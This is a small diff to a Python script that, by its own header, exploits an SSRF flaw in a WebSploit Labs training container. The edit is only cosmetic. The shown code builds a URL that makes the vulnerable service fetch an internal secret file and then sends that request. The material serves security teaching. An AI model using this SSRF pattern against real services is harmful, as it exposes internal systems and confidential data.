@@ -3,6 +3,7 @@ Script to exploit the SSRF in the WebSploit Labs Galatic Archives container.
 Author: Omar Santos @santosomar
 '''
 
+
 import requests
 
 # The URL of the vulnerable web service.
@@ -14,7 +15,7 @@ internal_url = 'https://internal.secretcorp.org/secret.txt'
 
 # The attacker constructs the exploit URL by appending the internal URL
 # as a query parameter to the vulnerable service's URL.
-exploit_url = vulnerable_url + '?url=' + internal_url
+exploit_url = f'{vulnerable_url}?url={internal_url}'
 
 # The attacker sends a request to the exploit URL.
 response = requests.get(exploit_url)
